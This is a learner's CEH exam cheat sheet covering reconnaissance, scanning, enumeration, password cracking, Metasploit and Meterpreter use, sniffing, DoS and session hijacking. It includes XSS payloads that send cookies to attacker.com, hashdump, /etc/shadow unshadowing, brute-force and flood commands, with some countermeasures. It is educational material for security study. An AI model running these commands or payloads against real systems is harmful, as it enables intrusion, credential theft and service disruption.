# CEH Cheat Sheet — Modules 1–11
**Author:** Nivedhitha KS | **GitHub:** github.com/NivedhithaKS-SEC/cybersec-journey  
**Updated:** Day 14 of 60-Day Cybersecurity Journey

---

## Quick Reference — Common Ports

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 21 | TCP | FTP | File Transfer — often misconfigured, anonymous login risk |
| 22 | TCP | SSH | Secure Shell — brute force target |
| 23 | TCP | Telnet | Unencrypted — plaintext creds visible in sniff |
| 25 | TCP | SMTP | Mail transfer — open relay abuse |
| 53 | TCP/UDP | DNS | Zone transfer attacks (port 53 TCP) |
| 80 | TCP | HTTP | Unencrypted web — sniffing risk |
| 443 | TCP | HTTPS | Encrypted web — TLS/SSL |
| 3306 | TCP | MySQL | Database — should never be publicly exposed |
| 3389 | TCP | RDP | Remote Desktop — brute force / BlueKeep |
| 445 | TCP | SMB | File sharing — EternalBlue, WannaCry |
| 8080 | TCP | HTTP-Alt | Proxy/dev servers |
| 4444 | TCP | Metasploit | Default Meterpreter reverse shell port |

---

## Module 1 — Introduction to Ethical Hacking

### 5 Phases of Hacking

```
Reconnaissance → Scanning → Gaining Access → Maintaining Access → Covering Tracks
```

| Phase | Description | Tools |
|-------|-------------|-------|
| **Reconnaissance** | Gather info without touching target | WHOIS, Google, Shodan, theHarvester |
| **Scanning** | Find open ports, services, vulns | Nmap, Nessus, Nikto |
| **Gaining Access** | Exploit vulnerabilities | Metasploit, SQLmap, Hydra |
| **Maintaining Access** | Stay persistent | Meterpreter, backdoors, cron jobs |
| **Covering Tracks** | Erase evidence | Log clearing, rootkits, timestomping |

### CIA Triad

| Principle | Meaning | Attack that breaks it |
|-----------|---------|----------------------|
| **Confidentiality** | Only authorised users see data | Sniffing, data breach |
| **Integrity** | Data is accurate and unaltered | MitM, tampering |
| **Availability** | Systems are up and accessible | DoS/DDoS, ransomware |

### Types of Hackers

| Type | Description |
|------|-------------|
| White Hat | Ethical hacker, has permission |
| Black Hat | Malicious, no permission |
| Grey Hat | No permission but benign intent |
| Script Kiddie | Uses tools without understanding them |
| Hacktivist | Hacks for social/political cause |

### Key Concepts

- **Threat** = Potential danger to an asset
- **Vulnerability** = Weakness that can be exploited
- **Risk** = Threat × Vulnerability × Impact
- **Exploit** = Code/technique that takes advantage of a vulnerability
- **Zero-day** = Vulnerability with no patch available yet
- **Penetration Testing** = Simulated attack with permission

---

## Module 2 — Footprinting & Reconnaissance

### Passive vs Active Recon

| Type | Description | Leaves traces? |
|------|-------------|---------------|
| **Passive** | No direct contact with target | No |
| **Active** | Direct contact (port scan, ping) | Yes |

### Key Tools

#### WHOIS
```bash
whois target.com
whois 1.2.3.4
```
Reveals: registrar, owner, creation date, name servers, contact email

#### DNS Lookup
```bash
nslookup target.com
dig target.com ANY          # All DNS records
dig target.com MX           # Mail servers
dig axfr @ns1.target.com target.com   # Zone transfer (if misconfigured)
host -t ns target.com       # Name servers
```

#### DNS Record Types
| Record | Purpose |
|--------|---------|
| A | IPv4 address |
| AAAA | IPv6 address |
| MX | Mail server |
| NS | Name server |
| CNAME | Alias |
| TXT | Text (SPF, DKIM, etc.) |
| PTR | Reverse DNS |
| SOA | Start of Authority |

#### Google Dorks
```
site:target.com               # All pages on domain
intitle:"index of"            # Directory listings
inurl:admin                   # Admin pages
filetype:pdf site:target.com  # PDFs only
"password" filetype:txt       # Password files
inurl:login site:target.com   # Login pages
```

#### theHarvester
```bash
theHarvester -d target.com -l 100 -b google
theHarvester -d target.com -l 100 -b all
# Outputs: emails, subdomains, IPs, open ports
```

#### Shodan
- Search: `apache port:8080 country:IN`
- Find exposed cameras: `webcam has_screenshot:true`
- Find specific server: `hostname:target.com`
- Default creds: `"default password" port:23`

#### Maltego
- GUI tool for visualising relationships
- Entities: Person → Email → Domain → IP → Organisation
- Transforms automatically look up data

#### Subdomain Enumeration
```bash
# Your own tool! Use it here
python3 subdomain_enum.py -d target.com -w wordlist.txt

# Other tools
sublist3r -d target.com
amass enum -d target.com
```

---

## Module 3 — Scanning Networks

### Nmap Flags Reference

| Flag | Full Name | Description |
|------|-----------|-------------|
| `-sS` | SYN scan | Stealth scan — half-open, doesn't complete handshake |
| `-sT` | TCP connect | Full connect scan — noisier |
| `-sU` | UDP scan | Scan UDP ports (slow) |
| `-sV` | Version detection | Detect service versions |
| `-sC` | Default scripts | Run Nmap default NSE scripts |
| `-O` | OS detection | Detect operating system |
| `-p-` | All ports | Scan all 65535 ports |
| `-p 80,443` | Specific ports | Scan only listed ports |
| `-A` | Aggressive | -sV + -sC + -O + traceroute |
| `-T0 to -T5` | Timing | T0=paranoid, T3=normal, T5=insane |
| `-v` | Verbose | Show more output |
| `-oN` | Normal output | Save to file |
| `-oX` | XML output | Save as XML |
| `--script` | Run script | E.g. `--script=vuln` |

### Common Nmap Commands

```bash
# Quick scan
nmap -sV 192.168.1.1

# Full port scan with version + scripts
nmap -sV -sC -p- 192.168.1.1

# Aggressive full scan
nmap -A -p- 192.168.1.1

# Scan entire subnet
nmap -sn 192.168.1.0/24       # Ping sweep (host discovery only)
nmap -sV 192.168.1.0/24

# Stealth SYN scan
nmap -sS -T2 192.168.1.1

# Vulnerability scripts
nmap --script=vuln 192.168.1.1
nmap --script=http-enum 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Save output
nmap -sV 192.168.1.1 -oN scan_results.txt
```

### TCP 3-Way Handshake
```
Client → SYN        → Server
Client ← SYN-ACK   ← Server
Client → ACK        → Server
(Connection established)
```

### Port States

| State | Meaning |
|-------|---------|
| **open** | Port accepts connections |
| **closed** | Port reachable but no service listening |
| **filtered** | Firewall blocking — no response |
| **unfiltered** | Accessible but state unknown |

### Banner Grabbing
```bash
nc -nv 192.168.1.1 80         # Netcat banner grab
telnet 192.168.1.1 80         # Telnet banner grab
curl -I http://target.com     # HTTP headers
```

---

## Module 4 — Enumeration

> Enumeration = Extract detailed info from a discovered service (usernames, shares, services)

### NetBIOS Enumeration
```bash
nbtstat -A 192.168.1.1         # Windows — NetBIOS table
nbtscan 192.168.1.0/24         # Linux — scan subnet
```

### SNMP Enumeration
```bash
snmpwalk -v2c -c public 192.168.1.1    # Walk entire MIB tree
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2  # Running processes
onesixtyone -c community.txt 192.168.1.1   # Brute force community string
```
Default community strings: `public`, `private`, `manager`

### LDAP Enumeration
```bash
ldapsearch -x -H ldap://192.168.1.1 -b "dc=target,dc=com"
enum4linux -a 192.168.1.1      # Also does LDAP, NetBIOS, SMB
```

### SMTP Enumeration
```bash
nc -nv 192.168.1.1 25
VRFY root               # Verify username exists
EXPN admin              # Expand mailing list
RCPT TO: admin@target.com
```

### SMB Enumeration
```bash
smbclient -L //192.168.1.1 -N       # List shares (no password)
smbclient //192.168.1.1/share -N    # Connect to share
enum4linux -a 192.168.1.1          # Full SMB enumeration
crackmapexec smb 192.168.1.0/24    # SMB scan subnet
```

### NTP Enumeration
```bash
ntpdate -q 192.168.1.1
ntpdc -c monlist 192.168.1.1   # DDoS amplification source
```

### enum4linux — All-in-One
```bash
enum4linux -a 192.168.1.1      # Full enum (users, groups, shares, OS info)
enum4linux -U 192.168.1.1      # Users only
enum4linux -S 192.168.1.1      # Shares only
```

---

## Module 5 — Vulnerability Analysis

### Key Concepts

| Term | Definition |
|------|-----------|
| **CVE** | Common Vulnerabilities and Exposures — unique ID per vuln (e.g. CVE-2021-44228) |
| **CVSS** | Common Vulnerability Scoring System — 0.0 to 10.0 severity score |
| **NVD** | National Vulnerability Database — nvd.nist.gov |
| **CWE** | Common Weakness Enumeration — weakness categories |
| **Exploit DB** | exploit-db.com — public exploit database |

### CVSS Score Ranges

| Score | Severity |
|-------|---------|
| 0.0 | None |
| 0.1 – 3.9 | Low |
| 4.0 – 6.9 | Medium |
| 7.0 – 8.9 | High |
| 9.0 – 10.0 | Critical |

### Nessus Workflow
```
1. Create new scan → choose template (Basic Network Scan)
2. Set target IP / range
3. Configure credentials (for authenticated scan)
4. Launch scan
5. Review results → filter by severity
6. Export report (PDF/CSV)
```

### Nikto — Web Scanner
```bash
nikto -h http://target.com
nikto -h http://target.com -p 8080
nikto -h http://target.com -o report.html -Format html
```
Finds: outdated software, misconfigurations, default files, dangerous HTTP methods

### OpenVAS
- Open-source Nessus alternative
- Web interface at `https://localhost:9392`
- Full vulnerability scanner

### Searchsploit (local Exploit-DB)
```bash
searchsploit apache 2.4
searchsploit --id ms17-010        # Get CVE/EDB ID
searchsploit -x 12345             # Examine exploit
searchsploit -m 12345             # Copy to current dir
```

---

## Module 6 — System Hacking

### Password Attack Types

| Attack | Description | Tools |
|--------|-------------|-------|
| **Dictionary** | Wordlist of common passwords | Hydra, John, Hashcat |
| **Brute Force** | Try every combination | Hydra, Hashcat |
| **Rainbow Table** | Precomputed hash → plaintext lookup | RainbowCrack, ophcrack |
| **Hybrid** | Dictionary + rules (append numbers) | Hashcat with rules |
| **Credential Stuffing** | Leaked creds from other breaches | Custom scripts |

### Hydra — Password Brute Force
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# HTTP login form
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.1

# Multiple usernames
hydra -L users.txt -P rockyou.txt ssh://192.168.1.1
```

### John the Ripper
```bash
john hash.txt                           # Auto-detect hash
john --wordlist=rockyou.txt hash.txt    # Dictionary attack
john --format=md5 hash.txt              # Specify format
john --show hash.txt                    # Show cracked passwords
unshadow /etc/passwd /etc/shadow > hashes.txt  # Prepare Linux hashes
```

### Hashcat
```bash
hashcat -m 0 hash.txt rockyou.txt       # MD5
hashcat -m 1000 hash.txt rockyou.txt    # NTLM (Windows)
hashcat -m 1800 hash.txt rockyou.txt    # SHA-512 (Linux)
hashcat -a 3 -m 0 hash.txt ?a?a?a?a    # Brute force 4 chars
```

### Metasploit Framework

```bash
# Start Metasploit
msfconsole

# Search for exploits
search ms17-010
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set required options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
exploit   # or: run

# Other commands
show payloads
show auxiliary
info                   # Info about current module
back                   # Go back
sessions -l            # List sessions
sessions -i 1          # Interact with session 1
```

### Meterpreter Commands

```bash
# System info
sysinfo
getuid
getpid

# File system
ls
pwd
cd C:\\Users
download file.txt /local/path
upload /local/file.txt C:\\target

# Privilege escalation
getsystem                  # Auto escalate to SYSTEM
getprivs                   # List privileges

# Persistence
run persistence -h         # Help for persistence module
run post/windows/manage/persistence

# Post exploitation
run post/windows/gather/hashdump    # Dump password hashes
run post/multi/recon/local_exploit_suggester

# Networking
portfwd add -l 8080 -p 80 -r 192.168.1.2  # Port forward
route add 10.0.0.0/8 1    # Add route through session

# Shell
shell                      # Drop to system shell
exit                       # Return to meterpreter
```

### Linux Privilege Escalation Checklist
```bash
sudo -l                             # What can I run as sudo?
cat /etc/passwd                     # User list
cat /etc/cron*                      # Cron jobs
find / -perm -4000 2>/dev/null      # SUID binaries
find / -writable 2>/dev/null        # Writable files
uname -a                            # Kernel version
env                                 # Environment variables
```

---

## Module 7 — Malware Threats

| Type | Description | Example |
|------|-------------|---------|
| **Virus** | Attaches to files, needs user to execute | File infector |
| **Worm** | Self-replicates across networks, no host needed | WannaCry |
| **Trojan** | Disguised as legit software | RAT (Remote Access Trojan) |
| **Ransomware** | Encrypts files, demands payment | LockBit, REvil |
| **Spyware** | Secretly monitors user activity | Keyloggers |
| **Adware** | Displays unwanted ads | Often bundled with freeware |
| **Rootkit** | Hides malware at OS/kernel level | Necurs |
| **Keylogger** | Records keystrokes | Hardware or software |
| **Botnet** | Network of infected machines | Mirai (IoT botnet) |
| **RAT** | Remote Access Trojan — full remote control | DarkComet, njRAT |
| **Dropper** | Installs other malware | First stage payload |
| **Fileless Malware** | Lives in memory, no file on disk | PowerShell attacks |

### Malware Analysis

| Type | Description |
|------|-------------|
| **Static** | Analyse without running (strings, hashes, PE headers) |
| **Dynamic** | Run in sandbox and observe behaviour |
| **Hybrid** | Both static + dynamic |

---

## Module 8 — Sniffing

### Key Tools

| Tool | Type | Use |
|------|------|-----|
| **Wireshark** | GUI | Full packet capture and analysis |
| **tcpdump** | CLI | Packet capture on Linux |
| **Ettercap** | GUI/CLI | MitM, ARP poisoning |
| **Bettercap** | CLI | Modern MitM framework |
| **Dsniff** | CLI | Password sniffing |
| **Cain & Abel** | Windows | Password recovery + ARP poison |

### tcpdump Commands
```bash
tcpdump -i eth0                         # Capture on interface
tcpdump -i eth0 -w capture.pcap        # Save to file
tcpdump -r capture.pcap                 # Read file
tcpdump port 80                         # Filter by port
tcpdump host 192.168.1.1               # Filter by host
tcpdump 'tcp port 80 and host 1.2.3.4' # Combined filter
tcpdump -i eth0 -n -v                  # Verbose, no DNS resolution
```

### Wireshark Filters
```
http                         # HTTP traffic only
ip.addr == 192.168.1.1       # Specific IP
tcp.port == 443              # Specific port
http.request.method == "POST"  # POST requests
!(arp or dns or icmp)        # Remove noise
tcp.flags.syn == 1           # SYN packets
```

### ARP Poisoning
```bash
# Ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.2/

# Bettercap
bettercap -iface eth0
net.probe on
arp.spoof.targets 192.168.1.1
arp.spoof on
net.sniff on
```

### Countermeasures
- Use HTTPS everywhere
- Use VPN
- Enable Dynamic ARP Inspection (DAI) on switches
- Use static ARP entries for critical hosts
- Use encrypted protocols (SSH not Telnet, SFTP not FTP)

---

## Module 9 — Social Engineering

| Attack Type | Description | Example |
|------------|-------------|---------|
| **Phishing** | Deceptive email to steal creds | Fake bank login page |
| **Spear Phishing** | Targeted phishing at specific person | CEO email spoofed |
| **Whaling** | Phishing targeting executives | CFO wire transfer scam |
| **Vishing** | Voice phishing over phone | Fake IT support call |
| **Smishing** | SMS phishing | "Your package is held, click here" |
| **Pretexting** | Fabricating a scenario | "I'm from IT, need your password" |
| **Baiting** | Lure with something attractive | Infected USB in parking lot |
| **Quid Pro Quo** | Offer something in exchange | "Fix your PC for your credentials" |
| **Tailgating** | Physical access by following someone | Walk in behind employee |
| **Shoulder Surfing** | Observe someone entering credentials | Watch keyboard in public |
| **Dumpster Diving** | Search trash for sensitive info | Old invoices, printouts |

### Social Engineering Tools
```bash
# SET (Social Engineering Toolkit)
setoolkit

# Options:
# 1 - Social-Engineering Attacks
# 2 - Spear-Phishing Attack Vectors
# 3 - Website Attack Vectors
```

### Red Flags to Recognise
- Urgency / pressure to act fast
- Too good to be true offers
- Unexpected requests for credentials
- Sender email doesn't match organisation
- Grammar/spelling errors

---

## Module 10 — Denial of Service (DoS)

| Attack Type | Description | Tools |
|------------|-------------|-------|
| **Volumetric** | Flood bandwidth with traffic | LOIC, HOIC, hping3 |
| **Protocol** | Exploit protocol weaknesses | SYN flood, ping of death |
| **Application Layer** | Target web app (Layer 7) | Slowloris, RUDY |
| **SYN Flood** | Send SYN packets, never complete handshake | hping3 |
| **ICMP Flood** | Ping flood | hping3 |
| **Smurf Attack** | Spoofed ICMP to broadcast address | Amplification |
| **DDoS** | Multiple sources coordinated | Botnets |
| **Amplification** | Small request → large response | DNS amplification |

### hping3 Commands
```bash
hping3 -S --flood -V -p 80 192.168.1.1     # SYN flood
hping3 -1 --flood 192.168.1.1              # ICMP flood
hping3 -2 --flood -p 53 192.168.1.1        # UDP flood
```

### Slowloris — Layer 7 DoS
```bash
slowloris 192.168.1.1 -p 80 -s 500
# Keeps HTTP connections open without completing them
# Exhausts server connection pool
```

### Countermeasures
- Rate limiting on firewall / load balancer
- SYN cookies to defend against SYN flood
- Anycast network diffusion
- CDN (Cloudflare, Akamai) for DDoS protection
- Blackhole routing for attack traffic

---

## Module 11 — Session Hijacking

### How Sessions Work
```
User logs in → Server creates session token → Token stored in cookie
Every request sends token → Server validates → Grants access
```

### Session Hijacking Methods

| Method | Description |
|--------|-------------|
| **Cookie Stealing** | XSS to steal session cookie |
| **Session Fixation** | Force victim to use attacker's session ID |
| **Session Prediction** | Guess sequential/weak session IDs |
| **Man-in-the-Middle** | Intercept session token in transit |
| **Cross-Site Scripting (XSS)** | Inject JS to steal `document.cookie` |

### XSS Cookie Theft Payload
```javascript
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">
```

### Tools

| Tool | Use |
|------|-----|
| **Burp Suite** | Intercept & modify session cookies |
| **OWASP ZAP** | Web app scanning + session testing |
| **Hamster + Ferret** | Session hijacking over network |
| **Firesheep** | (Old) WiFi session hijacking |

### Countermeasures
- Use `HttpOnly` flag on cookies (prevents JS access)
- Use `Secure` flag (HTTPS only)
- Use `SameSite` attribute on cookies
- Regenerate session ID after login
- Short session timeouts
- Implement CSRF tokens

---

## Tools Summary

| Tool | Category | Key Use |
|------|----------|---------|
| Nmap | Scanning | Port/service discovery |
| Metasploit | Exploitation | Exploit framework |
| Wireshark | Sniffing | Packet analysis |
| Hydra | Password | Brute force login |
| John the Ripper | Password | Hash cracking |
| Hashcat | Password | GPU hash cracking |
| theHarvester | Recon | Email/domain recon |
| Nessus | Vuln Scan | Vulnerability scanner |
| Nikto | Web | Web server scanner |
| Burp Suite | Web | HTTP interception/testing |
| SQLmap | Web | SQL injection automation |
| enum4linux | Enum | SMB/LDAP enumeration |
| Ettercap | Sniffing | ARP poisoning/MitM |
| hping3 | DoS | Packet crafting/flood |
| SET | Social Eng | Phishing campaigns |
| Maltego | OSINT | Relationship mapping |
| Shodan | OSINT | Internet device search |
| Searchsploit | Research | Local exploit database |

---

*This cheat sheet is part of my 60-day cybersecurity learning journey.*  
*GitHub: github.com/NivedhithaKS-SEC/cybersec-journey*
